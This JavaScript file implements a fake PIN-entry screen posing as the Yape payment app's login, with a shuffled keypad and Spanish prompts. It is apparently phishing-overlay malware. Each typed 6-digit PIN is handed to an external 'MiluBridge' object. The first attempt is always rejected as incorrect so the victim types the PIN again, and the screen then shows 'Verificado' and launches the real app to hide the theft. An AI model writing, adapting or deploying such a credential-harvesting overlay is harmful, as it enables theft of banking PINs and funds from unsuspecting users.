(() => {
  const PIN_LEN = 6;
  const dots = Array.from(document.querySelectorAll("#pinDots .dot"));
  const keypad = document.getElementById("keypad");
  const forgotBtn = document.getElementById("forgotBtn");
  const toastEl = document.getElementById("toast");

  let pin = "";
  let submitCount = 0;
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderDots() {
    dots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function shakeDots() {
    dots.forEach((dot) => {
      dot.classList.remove("is-shake");
      // force reflow
      void dot.offsetWidth;
      dot.classList.add("is-shake");
    });
  }

  function clearPin() {
    pin = "";
    renderDots();
  }

  function submitPin() {
    if (locked) {
      return;
    }
    locked = true;
    const value = pin;
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      toast("Clave incorrecta");
      shakeDots();
      window.setTimeout(() => {
        clearPin();
        locked = false;
      }, 350);
      return;
    }

    toast("Verificado");
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 400);
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 120);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  function shuffleDigits() {
    const digits = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
    for (let i = digits.length - 1; i > 0; i -= 1) {
      const j = Math.floor(Math.random() * (i + 1));
      const tmp = digits[i];
      digits[i] = digits[j];
      digits[j] = tmp;
    }
    return digits;
  }

  function renderKeypad() {
    const digits = shuffleDigits();
    // 前 9 个数字 + 空位 + 第 10 个数字 + 删除；空位/删除固定
    const cells = [
      ...digits.slice(0, 9).map((d) => ({ type: "digit", value: d })),
      { type: "empty" },
      { type: "digit", value: digits[9] },
      { type: "del" },
    ];
    keypad.innerHTML = "";
    cells.forEach((cell) => {
      if (cell.type === "empty") {
        const spacer = document.createElement("span");
        spacer.className = "key key-empty";
        spacer.setAttribute("aria-hidden", "true");
        keypad.appendChild(spacer);
        return;
      }
      if (cell.type === "del") {
        const btn = document.createElement("button");
        btn.type = "button";
        btn.className = "key key-del";
        btn.setAttribute("data-key", "del");
        btn.setAttribute("aria-label", "Borrar");
        btn.innerHTML =
            '<svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true">' +
            '<circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.6"/>' +
            '<path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M9 9l6 6M15 9l-6 6"/>' +
            "</svg>";
        keypad.appendChild(btn);
        return;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "key";
      btn.setAttribute("data-key", cell.value);
      btn.textContent = cell.value;
      keypad.appendChild(btn);
    });
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    const key = btn.getAttribute("data-key");
    if (key === "del") {
      deleteDigit();
      return;
    }
    if (/^\d$/.test(key)) {
      pushDigit(key);
    }
  });

  forgotBtn.addEventListener("click", () => {
    toast("Usa tu clave Yape para continuar");
  });

  renderKeypad();
  renderDots();
})();
